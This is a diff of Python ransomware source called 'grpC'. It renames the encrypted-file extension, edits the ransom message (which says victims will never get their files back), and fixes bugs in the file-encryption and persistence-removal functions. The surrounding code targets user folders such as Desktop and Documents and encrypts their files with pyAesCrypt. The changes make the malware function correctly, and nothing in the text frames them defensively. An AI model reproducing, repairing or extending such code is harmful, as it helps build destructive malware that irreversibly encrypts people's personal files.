@@ -6,7 +6,7 @@ from hashlib import sha256, sha512
 from pyAesCrypt import encryptFile, decryptFile
 
 project_name = sys.argv[0]
-filext = ".grpC"
+filext = ".LGXC"
 filelimit = 1024 * 1024 * 1024 # 1 GB
 allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
 
@@ -19,7 +19,7 @@ Anyways this is not your regular Ransomware; wanna know why?
 
 It's because you are never getting your files back and IDGAF about your money in exchange for your files back, you might as well use it to get a new PC for yourself. Good day!"""
     warningsHTML = """<h1>Oops your personal files have been encrypted :(</h1>
-<br> <br>
+
 If you see this text then it means that you have been infected by the grpC Ransomware
 <br> <br>
 Anyways this is not your regular Ransomware; wanna know why?
@@ -53,7 +53,7 @@ def find_files(mode="E"):
     return allFiles
 
 def encryptFiles(files, password):
-    files = filter_file_size(file)
+    files = filter_file_size(files)
     for file in files:
         try:
             encryptFile(file, file+filext, password, 64 * 1024)
@@ -101,7 +101,7 @@ def checkCompletion(check=True):
 def removepersistence():
     username = os.path.expanduser("~")
     path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
-    os.remove()
+    os.remove(path)
 
 
 def start(mode="E"):
